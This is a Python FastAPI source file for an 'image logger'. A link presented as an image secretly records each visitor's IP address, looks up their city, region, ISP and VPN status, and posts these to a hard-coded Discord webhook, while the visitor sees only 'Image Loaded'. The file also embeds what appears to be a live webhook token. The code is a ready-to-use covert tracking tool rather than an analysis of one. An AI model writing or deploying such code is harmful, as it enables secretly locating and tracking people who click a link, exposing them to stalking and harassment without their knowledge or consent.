from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

# Replace with your actual Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/")
async def log_request(request: Request):
    # 1. Get the real client IP (handling Render's proxy)
    client_ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0].strip()
    
    # 2. Fetch IP details from the API
    try:
        # Requesting specific fields: IP, Country, Region, City, ISP, and Proxy status
        api_url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query"
        data = requests.get(api_url, timeout=5).json()
        
        # 3. Format the message for Discord
        if data.get("status") == "success":
            message = (
                f"**Image Logger - IP Logged**\n"
                f"A User Opened the Original Image!\n\n"
                f"**IP Info:**\n"
                f"IP: `{data.get('query')}`\n"
                f"Provider: `{data.get('isp')}`\n"
                f"Country: `{data.get('country')}`\n"
                f"Region: `{data.get('regionName')}`\n"
                f"City: `{data.get('city')}`\n"
                f"VPN/Proxy: `{data.get('proxy')}`"
            )
        else:
            message = f"**New Visitor Detected!**\nIP Address: `{client_ip}`"
            
        requests.post(WEBHOOK_URL, json={"content": message}, timeout=5)
    except Exception as e:
        print(f"Error processing log: {e}")

    # 4. Return a simple response to the user
    return HTMLResponse(content="<html><body><h1>Image Loaded</h1></body></html>")
